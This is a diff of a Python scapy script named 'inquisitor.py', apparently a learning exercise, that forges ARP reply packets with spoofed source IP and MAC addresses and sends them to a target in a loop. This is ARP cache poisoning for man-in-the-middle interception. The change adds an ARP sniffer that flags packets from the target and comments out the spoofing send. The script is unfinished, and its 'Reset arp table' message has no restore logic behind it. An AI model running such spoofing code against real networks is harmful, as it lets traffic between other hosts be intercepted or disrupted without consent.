@@ -14,9 +14,13 @@
 
 from scapy.all import ARP, Ether, sendp, sniff
 import argparse
-import sys, os
+import sys
 
 ARP_TYPE = 0x0806
+IP_SRC = ""
+MAC_SRC = ""
+IP_TARGET = ""
+MAC_TARGET = ""
 
 # >>> ls(Ether)
 # dst        : DestMACField         = (None)
@@ -41,7 +45,7 @@ def parse_arguments():
 	parser.add_argument("MAC_target", metavar="<MAC-target>",help="Define the target MAC address")
 	return parser.parse_args()
 
-def create_arppkt(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
+def create_arppkt():
 	trame = Ether()
 	trame.type = ARP_TYPE
 
@@ -50,10 +54,10 @@ def create_arppkt(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
 	packet.plen = 4
 	packet.op = 2
 	try:
-		packet.hwsrc = MAC_src
-		packet.psrc = IP_src
-		packet.hwdst = MAC_target
-		packet.pdst = IP_target
+		packet.hwsrc = MAC_SRC
+		packet.psrc = IP_SRC
+		packet.hwdst = MAC_TARGET
+		packet.pdst = IP_TARGET
 	except OSError as error:
 		print(f"inquisitor.py: error: {error}")
 		exit(1)
@@ -63,7 +67,7 @@ def create_arppkt(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
 def send_packet(arppkt):
 	while True:
 		try:
-			sendp(arppkt)
+			sendp(arppkt, verbose=False)
 		except PermissionError as error:
 			print(f"inquisitor.py: error: {error}")
 			exit(1)
@@ -71,14 +75,23 @@ def send_packet(arppkt):
 			print(f"Reset arp table")
 			return
 
+def check_packet(packet):
+	print(packet)
+	if packet.psrc == IP_TARGET:
+		print("it's target!")
 
-def inquisitor(IP_src: str, MAC_src: str, IP_target: str, MAC_target: str):
-	arppkt = create_arppkt(IP_src, MAC_src, IP_target, MAC_target)
-	arppkt.show()
-	send_packet(arppkt)
+def inquisitor():
+	sniff(filter="arp", prn=check_packet)
+	# arppkt = create_arppkt()
+	# arppkt.show()
+	# send_packet(arppkt)
 
 if __name__ == "__main__":
 	args = parse_arguments()
 	if len(sys.argv) != 5:
 		exit(1)
-	inquisitor(args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
+	IP_SRC = args.IP_src
+	MAC_SRC = args.MAC_src
+	IP_TARGET = args.IP_target
+	MAC_TARGET = args.MAC_target
+	inquisitor()
